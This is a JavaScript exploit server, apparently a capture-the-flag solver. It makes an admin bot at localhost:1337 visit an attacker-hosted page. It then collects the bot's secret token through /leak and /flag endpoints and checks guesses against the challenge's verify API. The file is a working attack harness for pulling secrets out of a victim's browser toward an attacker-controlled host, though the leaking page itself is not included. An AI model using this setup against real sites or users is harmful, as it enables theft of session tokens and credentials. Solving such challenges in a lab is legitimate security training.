import fastify from "fastify";
import fs from "node:fs/promises";
import assert from "node:assert/strict";

const BOT_BASE_URL = "http://localhost:1337";
const BOT_ORIGIN = BOT_BASE_URL.replace(/\/+$/, "");
const CONNECTBACK_URL = "http://host.docker.internal:8080/";
const PORT = "8080";

let known = "TOKEN_";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = async (url) => {
  const started = Date.now();
  const res = await fetch(`${BOT_ORIGIN}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  });
  return {
    status: res.status,
    ms: Date.now() - started,
    text: await res.text(),
  };
};

const verifyToken = async (token) => {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5_000);
  const res = await fetch(`${BOT_ORIGIN}/api/verify`, {
    method: "POST",
    signal: controller.signal,
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ token }),
  });
  clearTimeout(timeout);
  return {
    status: res.status,
    text: await res.text(),
  };
};

const sendIndex = async (req, reply) => {
  console.log("[HIT]", req.ip, req.url, req.headers["user-agent"]);
  reply.type("text/html; charset=utf-8").send(await fs.readFile("index.html"));
};

app.get("/", sendIndex);

app.post("/debug", async (req, reply) => {
  console.log("[DEBUG]", req.body);
  return "";
});

app.post("/leak", async (req, reply) => {
  known = req.body;
  console.log({ known });
  return "";
});

app.post("/flag", async (req, reply) => {
  // get the flag!
  const token = req.body;
  console.log("[FLAG]", token);
  try {
    const result = await verifyToken(token);
    console.log({ token, verify: result });
    if (result.status === 200) {
      process.exit(0);
    }
  } catch (e) {
    console.log({ token, verifyError: String(e) });
  }
  known = "TOKEN_";
  return "";
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);

  for (let i = 0; i < 1; i++) {
    const url = `${CONNECTBACK_URL}?known=${encodeURIComponent(known)}`;
    console.log(`Report: ${i + 1}`, url);
    const result = await reportUrl(url);
    console.log("[REPORT]", result);
    known = "TOKEN_";
  }
  assert.fail("Failed");
});